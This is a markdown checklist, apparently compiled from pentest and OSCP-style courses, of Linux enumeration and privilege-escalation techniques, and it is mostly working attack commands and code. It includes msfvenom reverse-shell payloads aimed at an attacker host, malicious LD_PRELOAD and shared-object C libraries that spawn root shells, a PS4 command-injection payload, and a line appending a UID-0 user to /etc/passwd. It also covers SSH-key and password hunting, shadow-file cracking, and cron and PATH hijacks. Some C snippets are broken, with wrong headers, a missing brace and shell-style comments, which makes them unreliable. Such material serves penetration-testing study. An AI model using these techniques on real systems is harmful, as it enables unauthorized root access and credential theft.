# Linux Survey and Privilege Escalation

This checklist includes basic enumeration techniques using native bash commands, common enumeration tools, and techniques used to escalate priveleges on linux machines. This is a compialation from multiple courses, books, and other checklists that are referenced at the bottom and throughtout this checklist.

<br/>

## Automated Enumeration Tools

The below tools can be used to automate the survey and prviliege escalation process.  Reference the source documentation for detailedusage of each tool.  If you plan to use these, run as many as you can as each each one offers different outputs and recommendations that others do not:

#### Scripts:

* [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
    ```
    # print everything the script can gather and do not prompt for a password
    ./lse.sh -l 2 -i
    ```x
* [Linenum](https://github.com/rebootuser/LinEnum)
    ```
    # export files to a directory and do thorough tests
    ./linenum.sh -t -e linenum
    ```
* [linuxprivchecker](https://github.com/linted/linuxprivchecker)
* [beroot](https://github.com/AlessandroZ/BeRoot)
    ```
    # specify the user password to get more results
    python beroot.py --password super_strong_password
    ``` 
* [unix-priv-checker](http://pentestmonkey.net/tools/audit/unix-privesc-check)
    ```
   ./unix-privesc-check standard
   ./unix-privesc-check detailed
    ``` 

#### Exploit Suggesters:

* [linux-exploit-suggester (bash)](https://github.com/mzet-/linux-exploit-suggester)
* [linux-exploit-suggester2 (perl)](https://github.com/jondonas/linux-exploit-suggester-2)


<br/> 

## Transferring Files

Netcat:
```
# set up a listenr to serve the file 
nc -nlvp 4444 < <FILE>

# connect to the listener and grab the file 
nc <IP_ADDRESS> 4444 > <FILE> 
```

FTP Server Method:
```
# install the python module
pip3 install pyftpdlib

# start up the ftp server
python3 -m pyftpdlib -p 21 --write

# connect to the FTP server
ftp <IP_ADDR>
USER anonymous
PASSWORD <BLANK>

# grab file from target machine
get <FILE> 

# transfer file to target machine
put <FILE>
```

Web server method:
```
# start a webserver on kali using python:
python -m SimpleHTTPServer 80
python3 -m http.server 80

# grab file from the webserver
wget http://<IP_ADDRESS>/<FILE>
curl http://<IP_ADDRESS>/<FILE>
```
<br/> 

## Survey Commands (Work in Progress)

### System Information (Hardware/Software)
```
# kernel Version:
uname -a
cat /proc/version
cat /etc/issue

# release informatiion:
cat /etc/*-release

# CPU Architecture:
lscpu
```
What services are running:
```
ps aux
ps aux | egrep ^root
ps elf
```

<br/>

### Users and Groups

View the current user's information:
```
whoami
id

# my prvilieges (what commands can I run as sudo):
sudo -l
cat /etc/sudoers
sudo --version

# enviornment variables 
env
```
List users and groups:
```
cat /etc/passwd
cat /etc/groups
```
User passwords (typically not readable by a regular user):
```
cat /etc/shadow
```
*For each user, ensure to check their /home directory and look at the .bash_history

<br/> 

### Networking 

Network configuration: 
```
ip a 
ifconfig
```
Routing:
```
route
ip route
```
Neighbors:
```
arp -a
ip neigh
```
Display TCP/UDP connections:
```
# all
netstat
ss

# listinging ports
netstat -plant
ss -plant
```

Conntections Explained (reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

* Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card and anyone can connect to it (should have shown up in the nmap scan)
* Local address 127.0.0.1 means that the service is only listening for connections from the PC itself, not from the internet or anywhere else (will not show up in a external nmap scan)
* A private IP address means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet (will not show up in a external nmap scan)

Port forwarding an internal service to your attacker machine:
```
ssh -R <ATTACKER_PORT>:127.0.0.1:<SERVICE_PORT> <USERNAME>@<ATTACKER_IP>
```
<br/> 

### Cronjobs

List cron table files (cron tabs):
```
# user
cat /var/spool/cron
cat /var/spool/cron/crontabs/

# system-wide cron jobs 
cat /etc/crontab 
```
*Ensure to check for any cronjobs that are run by root and are world writeable

<br/>

### Password Hunting

Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#looting-for-passwords

Search the entire file system for the word *PASSWORD*:
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```
Search the file system for files that contain *password*
```
locate password | more
```
Search the file system for ssh keys:
```
# public keys 
find / -name authorized_keys 2> /dev/null

# private keys 
find / -name id_rsa 2> /dev/null
```

If you have access to the private keys, change the mode then try to use it to ssh to the target machine as root:
```
chmod 600 id_rsa

ssh -i id_rsa root@<IP_ADDRESS>
```
Use ssh2john to generate a hash file from a private key then crack with john:
```
python ssh2john.py id_rsa > id_rsa.hash

john --wordlist=darkweb2017-top10.txt id_rsa.hash
```

Chekc if there are any passwords in the history:
```
history
cat .bash_history
cat .mysql_history
cat .nano_history
```

Config files:
```
.ovpncat 
```

<br/>

## Priviliege Escalation Techniques

This section includes identifying and exploiting common vulnerabilites in Linux to gain root privlieges.

<br/>

### Path Injection

Determine what directories are contained within the PATH variable:
```
echo $PATH

# commmon directories
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Now determine if you have the ability to write to any of these directories and if there are any binaries that are being run from that directory:
```
ls -la <DIRECTORY>

# see if root is running any binaries from those directories
ps -aux | grep "^root"
```
If root is running a binary and you can write to the directory it is being run from, replace it with a malicous binary like a reverse shell:
```
# x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > <BINARY_NAME>.elf

# x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > <BINARY_NAME>.elf
```

<br/>

### Shell Escape Sequences

If a program has the SUID bit set, you can attempt to break out of a restricted enviornment and spawn an interactive shell.  View the full list of methods to do this on the [GTFObins github](https://gtfobins.github.io/#+shell).

<br/>


### Enviorment Variables via SUDO

#### LD_PRELOAD

LD_Preload (preloading) is a dynamic linker feature that allows us to execute our own shared library (preload) before any other libraries are loaded.  This means that any command that we execute as sudo will first execute our preloaded library before anything else is executed.

First see if we can edit the LD_PRELOAD enviornment variable:
```
TCM@debian:~/tools$ sudo -l
Matching Defaults entries for <USERNAME> on this host:
    env_reset, env_keep+=LD_PRELOAD
```

Craft a malicious library to be executed:

```
#include <stdioh>
#include <sys/types.h>
#include <stlib.h>

void _init() {

    # unset the LD_PRELOAD enviornement variable 
    unsetenv("LD_PRELOAD");
    
    # set group id and user id to 0 (root)
    setgid(0);
    setuid(0);
    
    # execute a bash shell as root 
    system("/bin/bash");
```

Compile this into a .so file and then load the .so file before executing a binary that you have sudo privilieges for: 
```
gcc -fPIC -shared -o shell.so <SHELL.C_FILE>

sudo LD_PRELOAD=<PATH/TO/SHELL.SO> <BINARY_WITH_SUDO_PRIVS>
```

<br/>

#### LD_LIBRARY_PATH

The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.  The `ldd` command can be used to print the shared libraries used by a program.  By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.

Apache example:
```
ldd /usr/sbin/apache2

linux-vdso.so.1 => (0x00007fff063ff000)
...
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
```

Now choose one of the shared objects to hijack (libcrypt.so.1) and create a malicious so to be loaded in its place:
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
Compile library_path.c into libcrypt.so.1:
```
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
```
sudo LD_LIBRARY_PATH=. apache2
```

<br/>

### Kernel Exploits 

Get the kernel version of the target machine:
```
uname -a
```
Now use the kernel version to find exploits:
```
searchsploit linux kernel <VERSION_NUMBER> priv esc
```
Use [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2) to get a more refined list:
```
perl linux-exploit-suggester-2.pl -k <VERSION_NUMBER>
```
If you discover any kernel exploits, there are pre-compiled exploits located [here](https://github.com/lucyoa/kernel-exploits)

<br/>

### Service Exploits 

Services are programs that run in the background.  Exploiting a service running as root provides command execution as root. 

First, show all processes running as root:
```
ps aux | grep "^root"
```
 Obtain the version of the identified programs:
 ```
 <PROGRAM> --version
 <PROGRAM> -v
 
 # debian
 dpkg -l | grep <PROGRAM>
 
 # rpm systems
 rpm -ga | grep <PROGRAM>
 ```

Use searchsploit to find exploits for these programs.
```
searchsploit <PROGRAM_NAME>
```

<br/>

### Password Cracking 

If you have access to the /etc/passwd and /etc/shadow, use `unshadow` to combine the two files into a format that can be cracked:
```
unshadow <PASSWD_FILE> <SHADOW_FILE> > <OUTPUT_FILE>
```
*Recommended delete all the users that do not have hashes to speed up the cracking process 

Crack using hashcator john:
```
#SHA512
hashcat -m 1800 <UNSHADOW_FILE> <WORDLIST> -O --force
john --format=raw-sha1 --wordlist=<WORDLIST> <UNSHADOW_FILE>
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<br/>

### SUID/SGID 

In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd): 
```
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
```
This is because to change your password, it will need to write to the /etc/shadow file that a regular user have access to. root does, so it has root privileges to make the right changes.

Their are also binariers that are run with the permissions of the group (SGID): 
```
ls -la /usr/bin/wall
-rwxr-sr-x 1 root tty 35048 May 22  2020 /usr/bin/wall
```
To start, find all files owned by the root user with the SUID bit set:
```
find / -perm -u=s -type f 2>/dev/null

# SUID/SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
For each binary that is found, reference the [GTFObins SUID](https://gtfobins.github.io/#+suid) page to see if there is a way to escalate privileges via SUID.  If none exist, move on to the next section.

<br/>

#### Shared Object Injection (SUID/SGID)

Again use the find command to look for files with the SUID bit set:
```
find / -type f -perm -04000 -ls 2>/dev/null
```

Now we start looking for shared objects.  When a program is execited, it will try to load the shared objects it requires.  Using `strace` we can track the system calls and determine whether any shared objects were not found.  If we can write to the location the program tries to open the shared object, we can create a malicious shared object to spawn a root shell.

```
strace <SUID_BINARY>
```
Pipe strace through grep to find key words that can be used for exploitation, such as file not found:
```
strace <SUID_BINARY> 2>&1 | grep -iE "open|access|no such file"

# example output
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
Determine if the .so is owned by root, then if we have permissions to write to the directory where a .so file is missing, we can create a malicious .so written in C and place it there:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
     setuid(0);
     system("/bin/bash -p");
}

```
These contents will just spawn a shell when loaded.  Compile this into an so file:
```
gcc -shared -fPIC -o <OUTPUT_FILE>.so <INPUT_FILE>
```
Replace the legitmate .so with the malicious .so file.  Now execute the original file with the SUID bit set and you should get a root shell.

<br/>

### Binary Symlinks

Nginx vulnerability example that allows you to escalate from www-data to root user:

https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

<br/>

### PATH Enviornement Variable

The PATH environment variable contains a list of directories where the shell should try to find programs. If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found.  Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

Look at executeables with SUID/SGID set to:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Running strings against a binary with the SUID/SGID set to see plaintext and see what it is tring to execute:
```
strings /path/to/file

# example
service apache2 start
```
Run strace against the SUID binary to verify and see how it is executed:
```
strace -v -f -e execve <BINARY> 2>&1 | grep service

# same verification
$ ltrace <BINARY> 2>&1 | grep service
```

if there is an executeable being used (Apache in this example), it is in the PATH, and we can write to the PATH, create a malicious binary to replace it:
```
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

Or do this in a one liner:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/<SERVICE>.c
```
This will spawn a root shell. Compile this to the same name of the vulnerable executeable:
```
gcc -o <NAME> <INPUT_FILE>
```
Last preppend your current directory with the malicious executeable in it and then execute the executeable with the SUID bit set:
```
PATH=.:$PATH <PATH_TO_EXECUTEABLE>
```
<br/>

### Abusing Shell Features

#### Bash Functions

Bash lower than version 4.2-048 allows us to define bash functions with / in the name, which take precednece over any executeable in the PATH.  So even if a SUID executeable is calling another executeable with an absolute path, we can create a bash function using the same name.

Verify the version of Bash is lower than 4.2-048:
```
bash --version
```
Running strings against a binary with the SUID/SGID set to see plaintext and see what it is tring to execute:
```
strings <SUID_BINARY>

#example output
/usr/sbin/service apache2 start

# verify
strace <SUID_BINARY>
ltrace <SUID_BINARY>
```
create a function with the same name as the one called in the SUID executebale (service in this example) then export the function:
```
function /usr/sbin/service { /bin/bash -p; }
export –f /usr/sbin/service
```
Now run the SUID executeabke to spawn a root shell

<br/>

#### Bash Debugging Mode 

Bash has a debugging mode which can be enabled with the –x command line option, or by modifying the SHELLOPTS environment variable to
include xtrace.  By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.

If a SUID file runs another program via Bash (e.g. by using system()) these environment variables can be inherited.  If an SUID file is being executed, this command will execute with the privileges of the file owner (root)

*In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.

First run strings/strace/ltrace against SUID binary to ensure that the system function is being used to execute a program.  Then run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' <SUID_BINARY>
```
Last run the /tmp/rootbash file with the -p command line option to get a root shell:
```
/tmp/rootbash -p
```
<br/>

### Weak File Permissions 

World Readable - means it can be read by anyone 
World writeable - anyone can write to the file 

If /etc/shadow is readable we can add a user to it by generating a password with the correct hash:
```
mkpasswd -m sha-512 <PASSWORD>
```
Now replace the root users password hash with the one that you made.  Now you can su to root!

<br/>

If /etc/passwd is writeable we can add a user to it.  The /etc/passwd historically contained user password hashes.  For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow. If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.

Generate a password hash to be placed in /etc/passwd:
```
openssl passwd "password"
```
Now add the password hash to the second field in the /etc/passwd file in place if the X for the root user.  You can also just remove the x in the second field for root user, this makes it think that there is no password for the root user then you can just su to root.

Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different:
```
echo "<USERNAME>:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```

<br/>

### Capabilites 

```
getcap -r / 2>/dev/null

#look for this
cap_setuid
```


### NFS Root Squashing

Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group.  While this behavior is default, it can be disabled!

no_root_squash is an NFS configuration option which turns root squashing off.  When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.

Start by viewing the contents of the NFS share configuration file:
```
cat /etc/exports 
```
Look for directories with the *no_root_squash* option like the /tmp directory is configured here:
```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
This means files can be written to this directory as the root user over NFS.  Now we would try to mount the /tmp share:
```
showmount -e <IP_ADDRESS>
```
If the ouput says the /tmp share is available to mount, Create a elf file to execute a bash shell and place it in the mounted share:
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /<MOUNTED_SHARE>/shell.elf
chmod +xs /tmp/nfs/shell.elf
ls -la shell.elf

# C version
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
ls -la x
```
Confirm that the file is executeable and owned by root then mount the share:
```
mkdir /tmp/nfs
mount -o rw,vers=2 <IP_ADDRESS>:</SHARE> /tmp/nfs
```
Now chmod the file and set the SUID bit, this way it will be placed in the /tmp as the root user:
```
chmod +xs /tmp/nfs/shell.elf
```
On the target machine, confirm the target was created with the correct permissions and excute the file to get a root shell
```
ls -la /tmp/shell.efl
/tmp/shell.elf
```

<br/>



### Scheduled tasks 

Check for sheduled tasks:
```
# systemd timers (similar to cron jobs):
systemctl list timers -all

# cronjobs
cat /etc/crontab
```

<br/> 

#### Cron Path Exscalation

 The path which the cron jobs searches for binaries is found when looking at the cron table: 
 ```
 cat /etc/crontab | grep "PATH="
 ```
Now look at the cron jobs that are executed by root.  Do any of them run a binary with a relative PATH?  If so, check the first directory in the PATH for the binary/sciprt.  If it does not exist, make one with a reverse shell, or add a bash binary with SUID like so:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /PATH/bash
chmod +x /PATH/bash
/PATH/bash -p
```
<br/>

#### Cron Wildcards

TO DO

<br/>

#### Cron Overwrite 

If you can overwrite/append to the file being executed by root, you could append a reverse shell or have it generate an SUID bash binary to tmp:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

<br/>

### Docker

*Linenum will pick this up*

Use gtfobins (if in the docker group): https://gtfobins.github.io/gtfobins/docker/
```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
<br/>

## Reverse Shells 
```
msfvenom -p linux/x86/reverse_shell_tcp lhost= lport= -f elf -o rev_shell.elf
```

reverse shell generator: https://github.com/mthbernardes/rsg 

<br/>

## References 

Checklists:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
* https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
* http://www.dankalia.com/tutor/01005/0100501004.htm

Courses:
* Udemy Linux Privilege Escalation for OSCP and Beyond! course
* Udemy Linux Privilege Escalation for Begginers course
* https://tryhackme.com/room/linuxprivescarena
* https://github.com/sagishahar/lpeworkshop
